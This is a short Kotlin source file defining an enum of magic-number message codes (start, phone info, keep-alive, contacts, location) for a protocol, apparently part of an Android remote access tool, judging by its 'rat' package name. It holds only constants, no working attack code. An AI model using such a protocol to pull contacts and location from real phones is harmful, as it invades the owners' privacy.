package ru.awawa.rat.worker.helper.protocol


enum class MagicNumber(val value: Int) {
    START(0xffbbeedd.toInt()),
    PHONE_INFO(0xffeeddbb.toInt()),
    KEEP_ALIVE(0xbbddffee.toInt()),
    CONTACTS(0xddfebdbe.toInt()),
    LOCATION(0xfdfebdbe.toInt())
}